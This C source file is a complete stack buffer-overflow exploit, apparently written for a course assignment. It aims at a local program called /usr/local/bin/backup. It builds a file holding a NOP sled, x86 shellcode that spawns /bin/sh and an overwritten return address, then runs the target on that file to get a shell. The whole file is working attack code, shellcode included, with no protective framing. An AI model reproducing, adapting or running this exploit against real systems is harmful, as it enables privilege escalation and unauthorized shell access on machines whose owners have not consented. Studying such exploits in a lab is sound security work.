#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

#define PERL "/usr/local/bin/perl"
#define TARGET "/usr/local/bin/backup"


/* our shell code */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

/* NOP */
static char NOP[] = "\x90";

/* this is the return addr that we will overwritten to,
   we got this return address by stackpointer - 1500
   since the first part of the code are filled by \x90
   we just need to arbitrarily pick an address before
   the shell code executes */
static char retaddr[] = "\x90\xd7\xbf\xff";

/* find the sp */
unsigned long get_sp(void){
    __asm__("mov %esp, %eax");
}

/* we create a file with content that will overwrite the buffer
   when executing the backup applications, for more details, please
   see a1-milestones */
int main(){
   unsigned int i;
   char *args[4];
   char *env[1];
   unsigned int addr;
   FILE *file;

   file = fopen("temp.txt", "w+");

   for (i = 0; i<3000; i++){
	fprintf(file, "%s", NOP);
   }

   fprintf(file, "%s", shellcode);

   for (i = 0; i<1055; i++){
	fprintf(file, "%s", NOP);
   }

   addr = get_sp() - 1500;

   fprintf(stderr, "0x%x\n", addr);	
   fprintf(file, "%s", retaddr);

   fclose(file);


   args[0] = TARGET; args[1] = "backup";
   args[2] = "temp.txt"; args[3] = NULL;

   env[0] = NULL;

   if (execve(TARGET, args, env) < 0)
	fprintf(stderr, "execve failed.\n");

   return 0;
}
